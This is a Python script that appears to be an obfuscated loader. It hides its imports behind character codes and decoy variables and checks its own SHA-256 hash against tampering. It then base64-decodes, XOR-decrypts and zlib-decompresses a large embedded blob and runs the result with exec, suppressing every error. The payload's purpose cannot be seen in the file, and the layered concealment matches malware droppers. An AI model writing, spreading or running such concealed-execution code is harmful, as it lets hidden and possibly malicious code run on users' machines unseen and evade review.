import random
_GARBAGE_1=len("self_check")
_GARBAGE_2=locals()
class UselessClass:
    def __init__(self,x):
        self.val=sum(range(x)) if x>0 else 0
    def __repr__(self):
        return f"UselessObj(val={self.val})"
def _check_integrity():
    try:
        h_mod_name="".join(['h','a','s','h','l','i','b'])
        hashlib=__import__(h_mod_name)
        expected_hash="57fa1aa4bafc3b4825148e1340c2b9b722c93b86f30acba8f4464b8e5b8a1b91"
        with open(__file__,'rb') as f:
            content=f.read()
        placeholder=b'57fa1aa4bafc3b4825148e1340c2b9b722c93b86f30acba8f4464b8e5b8a1b91'
        actual_content=content.replace(expected_hash.encode('utf-8'),placeholder)
        sha256_func=getattr(hashlib,'sha'+'256')
        current_hash=sha256_func(actual_content).hexdigest()
        if current_hash!=expected_hash:
            raise ValueError("Invalid script format or corrupted file.")
    except Exception as e:
        _ = 1/(1 if "corrupted" in str(e) else 0)
if UselessClass(5).val==10:
    _check_integrity()
_b64_name=''.join(chr(c) for c in [98,97,115,101,54,52])
_z_name="".join(['z','l','i','b'])
_h_name="hashlib"
_b=__import__(_b64_name)
_z=__import__(_z_name)
_h=__import__(_h_name)
_xor=lambda d,k:bytes([b^k[i%len(k)] for i,b in enumerate(d)])
_gk=lambda s:getattr(_h,'sha'+'256')(s).digest()
_payload_parts=['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','GgoSTsQ==']
_s="".join(_payload_parts)
_encoded_seed="YV92ZXJ5X3NlY3VyZV9hbmRfcmFuZG9tX3NlZWRfMTIzNDVfZmluYWw="
try:
    _seed_bytes=getattr(_b,'b64d'+'ecode')(_encoded_seed)
    _seed=_seed_bytes.decode('utf-8')
    _k=_gk(_seed.encode())
    _d_b64=getattr(_b,'b64'+'decode')(_s)
    _d_xor=_xor(_d_b64,_k)
    _decompressed=getattr(_z,'de'+'compress')(_d_xor)
    _final_code=_decompressed.decode('utf-8')
    execution_globals={'__name__':'__main__','__file__':__file__,}
    exec(_final_code,execution_globals)
except Exception as e:
    pass
